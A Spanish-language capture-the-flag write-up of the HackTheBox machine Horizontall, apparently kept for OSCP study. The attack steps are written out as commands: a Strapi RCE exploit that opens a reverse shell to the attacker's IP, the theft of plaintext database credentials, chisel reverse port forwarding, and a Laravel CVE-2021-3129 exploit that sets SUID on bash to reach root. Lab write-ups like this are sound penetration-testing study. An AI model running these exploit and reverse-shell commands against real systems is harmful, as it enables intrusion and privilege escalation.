---
layout: post
title: Horizontall
date: 2023-06-07
description:
img:
fig-caption:
tags: [eCPPTv2, OSCP]
---
___

<center><img src="/writeups/assets/img/Horizontall-htb/Horizontall.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclousure - Subdominio en JS File

* Strapy - RCE

* Remote Port Forwarding

* Laravel - RCE (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.105 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 11:04 GMT
Nmap scan report for 10.10.11.105
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.105 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 11:05 GMT
Nmap scan report for 10.10.11.105
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds
```

Añado el dominio ```horizontall.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://horizontall.htb
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Horizontall-htb/1.png" alt="">

Filtro por los archivos en ```JavaScript```

```null
curl -s -X GET http://horizontall.htb/ | grep -oP '".*?"' | tr -d '"' | grep js$
/js/app.c68eb462.js
/js/chunk-vendors.0e02b89e.js
/js/chunk-vendors.0e02b89e.js
/js/app.c68eb462.js
```

Descargo todos

```null
for i in $(curl -s -X GET http://horizontall.htb/ | grep -oP '".*?"' | tr -d '"' | grep js$); do wget http://horizontall.htb/$i; done
```

Y convierto en un formato legible

```null
js-beautify *
beautified app.c68eb462.js
beautified app.c68eb462.js.1
beautified chunk-vendors.0e02b89e.js
beautified chunk-vendors.0e02b89e.js.1
```

Entre todos los datos, se leakea un subdominio

```null
cat * | grep -oP '".*?"' | tr -d '"' | grep http | grep -viE "w3|bootstrap|Agent" | sort -u
http://api-prod.horizontall.htb/reviews
https://horizontall.htb
```

Lo añado al ```/etc/hosts``` y tramito una petición por GET

```null
 curl -s -X GET http://api-prod.horizontall.htb/ | html2text

****** Welcome. ******
```

En las cabeceras de respuesta se puede ver que se está empleando ```Strapy```. Es vulnerable a ejecución remota de comandos. Encuentro un [exploit](https://raw.githubusercontent.com/hadrian3689/strapi_cms_3.0.0-beta.17.7/master/strapi_exp.py) que me permite enviar una reverse shell

```null
python3 strapi_exp.py -t http://api-prod.horizontall.htb/ -e admin@horizontall.htb -p rubbx -lhost 10.10.16.9 -lport 443
```

Gano acceso al sistema en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.105] 56178
bash: cannot set terminal process group (1911): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
strapi@horizontall:~/myapi$ export TERM=xterm
strapi@horizontall:~/myapi$ export SHELL=bash
strapi@horizontall:~/myapi$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
strapi@horizontall:/home/developer$ cat user.txt 
a3c8f26f8f3db2d9ccdd4fd3bcf838a5
```

# Escalada

Este usuario tiene un directorio donde se exponen credenciales en texto claro de acceso a la base de datos

```null
strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

El puerto 8000 está abierto internamente

```null
strapi@horizontall:~$ ss -nltp
State                Recv-Q                Send-Q                                Local Address:Port                               Peer Address:Port                                                              
LISTEN               0                     80                                        127.0.0.1:3306                                    0.0.0.0:*                                                                 
LISTEN               0                     128                                         0.0.0.0:80                                      0.0.0.0:*                                                                 
LISTEN               0                     128                                         0.0.0.0:22                                      0.0.0.0:*                                                                 
LISTEN               0                     128                                       127.0.0.1:1337                                    0.0.0.0:*                   users:(("node",pid=1911,fd=31))               
LISTEN               0                     128                                       127.0.0.1:8000                                    0.0.0.0:*                                                                 
LISTEN               0                     128                                            [::]:80                                         [::]:*                                                                 
LISTEN               0                     128                                            [::]:22                                         [::]:*                            
```

Se está empleando ```Laravel```

```null
strapi@horizontall:~$ curl -s http://127.0.0.1:8000 | tail -n 7 | head -n 1
                            Laravel v8 (PHP v7.4.18)
```

Utilizo ```chisel``` para hacer ```Remote Port Forwarding```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Y en la máquina víctima como cliente

```null
strapi@horizontall:/tmp$ ./chisel client 10.10.16.9:1234 R:8000:127.0.0.1:8000
```

Utilizo este [exploit](wget https://raw.githubusercontent.com/nth347/CVE-2021-3129_exploit/master/exploit.py) y le asigno SUID a la ```bash```

```null
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'chmod u+s /bin/bash'
```

Puedo ver la segunda flag

```null
strapi@horizontall:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
strapi@horizontall:/tmp$ bash -p
bash-4.4# cat /root/root.txt
22bd1f2cd1a9c7cb72c8183da48cdbc7
```